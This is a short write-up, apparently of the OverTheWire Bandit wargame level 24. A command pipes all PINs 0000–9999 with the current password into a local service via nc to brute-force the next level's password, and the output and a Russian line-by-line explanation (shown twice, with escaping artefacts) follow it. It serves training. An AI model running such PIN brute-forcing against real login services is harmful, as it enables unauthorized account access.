# Bandit Level 24

```bash
bandit24@bandit:~$ seq -w 0000 9999 | sed "s/^/$pass /" | nc localhost 30002 | grep -v 'Wrong'
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4

bandit24@bandit:~$
pass=... --- берём пароль текущего уровня.
seq -w 0000 9999 --- генерирует PINы 0000...9999 с ведущими нулями.
sed "s/^/$pass /" --- добавляет к каждому PIN строку ">пароль&gt; >PIN&gt;".
| nc localhost 30002 --- отправляет все 10000 строк в одном TCP-соединении, как требует условие.
grep -v 'Wrong' --- отбрасывает ответы «Wrong», остаётся строка с паролем bandit25.
```

pass=... --- берём пароль текущего уровня.

seq -w 0000 9999 --- генерирует PINы 0000...9999 с ведущими нулями.

sed \"s/\^/\$pass /\" --- добавляет к каждому PIN строку \"<пароль>\<PIN\>\".

\| nc localhost 30002 --- отправляет все 10000 строк в одном TCP-соединении, как требует условие.

grep -v \'Wrong\' --- отбрасывает ответы «Wrong», остаётся строка с паролем bandit25.
